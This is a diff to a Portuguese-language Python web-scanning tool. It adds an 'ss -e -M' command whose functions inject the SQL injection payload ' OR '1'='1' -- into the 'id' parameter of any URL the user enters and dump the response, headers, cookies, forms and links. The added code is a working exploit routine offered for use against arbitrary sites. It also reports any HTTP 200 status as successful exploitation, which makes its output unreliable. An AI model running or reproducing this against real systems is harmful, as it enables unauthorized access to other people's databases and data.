@@ -29,6 +29,7 @@ def show_commands():
     print("'ss -i' - Verificar vulnerabilidade de IDOR\n")
     print("'ss -v' - Verificar se há vulnerabilidade XSS, IDOR e SQL injection\n")
     print("'ss dir -w (wordlist)' - Testar possíveis diretórios do site usando uma wordlist\n")
+    print("'ss -e -M' - Explorar vulnerabilidade (SQLi)")
     print("'info' - Mostrar informações sobre o programa\n")
     print("'clear' - Limpar a tela\n")
     print("'exit' - Sair\n\n\n")
@@ -121,6 +122,82 @@ def get_subdomains(url):
         print("Erro ao obter informações de subdomínios. Verifique a URL e a conexão com a Internet.")
     except Exception as e:
         print(f"Ocorreu um erro inesperado: {e}")
+
+# Função para explorar a vulnerabilidade de injeção de SQL
+def exploit_sql_injection(url, vulnerable_parameter):
+    # Inserção do payload para exploração de injeção de SQL
+    payload = f"' OR '1'='1' -- "
+    # Construção da URL com o payload injetado no parâmetro vulnerável
+    target_url = f"{url}?{vulnerable_parameter}={payload}"
+
+    # Armazena o payload injetado para uso posterior
+    injected_payload = payload
+
+    try:
+        # Realiza a requisição HTTP com o payload injetado
+        response = requests.get(target_url)
+
+        if response.status_code == 200:
+            # A resposta contém os dados do banco de dados ou uma mensagem que indica sucesso na exploração
+            print("\nVulnerabilidade de injeção de SQL explorada com sucesso!")
+            print("Dados obtidos:")
+            print(response.text)
+
+            # Exibe informações adicionais sobre a resposta
+            print("\nInformações adicionais:")
+            print(f" - URL: {response.url}")
+            print(f" - Código de status: {response.status_code}")
+            print(f" - Tamanho da resposta: {len(response.text)} bytes")
+            print(f" - Cabeçalhos da resposta: {response.headers}")
+            print(f" - Cookies da resposta: {response.cookies}")
+            print(f" - Servidor: {response.headers.get('server')}")
+            print(f" - Tipo de conteúdo: {response.headers.get('content-type')}")
+
+            # Analisa o HTML da resposta para obter mais informações relevantes
+            soup = BeautifulSoup(response.text, "html.parser")
+
+            # Obtém os formulários presentes na página
+            forms = soup.find_all("form")
+            if forms:
+                print(f" - Formulários encontrados na página: {len(forms)}")
+                for form in forms:
+                    print(f"   - Action do formulário: {form.get('action')}")
+                    print(f"   - Método do formulário: {form.get('method')}")
+
+            # Obtém os links presentes na página
+            links = soup.find_all("a")
+            if links:
+                print(f" - Links encontrados na página: {len(links)}")
+                for link in links:
+                    print(f"   - URL do link: {link.get('href')}")
+
+            # Outras informações adicionais relevantes podem ser obtidas de acordo com a estrutura da página
+
+            # Retornar o payload injetado e os dados da resposta
+            return injected_payload, response.text
+        else:
+            print("\nA exploração falhou. A vulnerabilidade de injeção de SQL pode não estar presente ou o servidor rejeitou a solicitação.")
+            return None, None
+    except requests.exceptions.RequestException as e:
+        print("\nErro ao fazer a requisição. Verifique a URL e a conexão com o servidor.")
+        return None, None
+    except Exception as e:
+        print(f"\nOcorreu um erro inesperado: {e}")
+        return None, None
+    
+def metasploit_scan():
+    try:
+        print("\nIniciando o scan de penetração semelhante ao Metasploit...\n")
+
+        # Vamos supor que a vulnerabilidade de injeção de SQL esteja no parâmetro 'id' de uma URL
+        url = input("Digite a URL do site vulnerável: ")
+        vulnerable_parameter = "id"
+
+        # Realiza a exploração da vulnerabilidade de injeção de SQL
+        exploit_sql_injection(url, vulnerable_parameter)
+
+    except Exception as e:
+        print("Ocorreu um erro durante o scan de penetração: ", e)
 
 
 def perform_whois(url):
@@ -323,6 +400,11 @@ while True:
         time.sleep(1)
         check_idor(url)
         print("\n\n")
+    elif command == "ss -e -M":
+        metasploit_scan()
+
+
+
 
     elif command == "clear":
         if os.name == "posix":
@@ -366,6 +448,8 @@ while True:
             elif subcommand == "-i":
                 url = input("Digite a URL do site: ")
                 check_idor(url)
+          
+                
 
             elif subcommand == "dir":
                 # Verifica se a opção -w e o caminho da wordlist estão no comando
